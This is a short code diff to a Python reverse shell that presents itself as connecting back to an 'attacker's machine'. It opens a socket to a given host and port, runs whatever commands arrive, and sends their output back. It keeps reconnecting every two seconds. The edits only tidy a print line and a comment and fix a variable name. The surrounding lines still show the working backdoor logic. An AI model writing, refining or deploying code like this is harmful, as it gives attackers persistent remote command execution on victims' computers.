@@ -16,7 +16,7 @@ def parse_args():
 def connect(host, port):
 	s = socket.socket()
 	print("[*] Attempting to connect back to attacker's machine ...")
-	print("                           (Set up a listener on: tcp/{})".format(port))
+	print("       (Set up a listener on: tcp/{})".format(port))
 	s.connect((host, port))
 	return s
 
@@ -36,7 +36,6 @@ def wait(s):
 		stdout = p.stdout.read() + p.stderr.read()
 		s.send(stdout)
 		return False
-		# return False for persistence, hence main() while loop
 
 def main():
 	
@@ -50,8 +49,8 @@ def main():
 			s = connect(host, port)
 			print("[*] Connection successful!")
 			while True:
-				dead = wait(s)
-			go.close()	
+				dead = wait(s)  # until dead=True, connections persists, hence returning False w/ stdout
+			s.close()	
 		except socket.error:
 			pass
 		time.sleep(2)
